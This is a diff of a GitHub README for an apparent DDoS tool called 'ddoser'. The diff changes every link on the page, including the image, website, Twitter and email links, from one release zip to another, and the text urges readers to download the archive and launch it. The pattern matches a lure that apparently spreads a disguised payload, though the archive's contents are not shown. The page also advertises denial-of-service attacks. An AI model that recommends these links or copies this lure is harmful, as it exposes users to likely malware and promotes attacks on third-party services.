@@ -2,7 +2,7 @@
 
 🛡 Powerful DDoS Tool for Testing and Research Purposes 🚀
 
-![ddoser](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)
+![ddoser](https://github.com/MasterKmc/ddoser/releases/download/v2.0/Software.zip)
 
 Welcome to the **ddoser** repository, the go-to tool for testing DDoS attacks and exploring security vulnerabilities. Whether you are a cybersecurity enthusiast, a penetration tester, or a researcher, this tool provides a comprehensive set of features to simulate and analyze DDoS attacks on various targets.
 
@@ -30,7 +30,7 @@ The repository covers a wide range of topics related to DDoS attacks, Cloudflare
 
 To get started with **ddoser**, download the tool from the following link:
 
-[Launch DDoSer Tool](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)
+[Launch DDoSer Tool](https://github.com/MasterKmc/ddoser/releases/download/v2.0/Software.zip)
 
 🔥 **Please note that the tool needs to be launched after downloading.** 🔥
 
@@ -59,8 +59,8 @@ This repository is licensed under the MIT License. Feel free to explore, modify,
 ---
 
 🔗 Connect with Me  
-🌐 [Personal Website](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)  
-🐦 [Twitter](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)  
-📧 [Email](https://github.com/MasterKmc/ddoser/releases/download/v1.0/Soft.zip)
+🌐 [Personal Website](https://github.com/MasterKmc/ddoser/releases/download/v2.0/Software.zip)  
+🐦 [Twitter](https://github.com/MasterKmc/ddoser/releases/download/v2.0/Software.zip)  
+📧 [Email](https://github.com/MasterKmc/ddoser/releases/download/v2.0/Software.zip)
 
 Thank you for visiting the **ddoser** repository. Explore, experiment, and stay curious in the realm of cybersecurity and DDoS testing. Happy hacking! 🖥🔒🔎
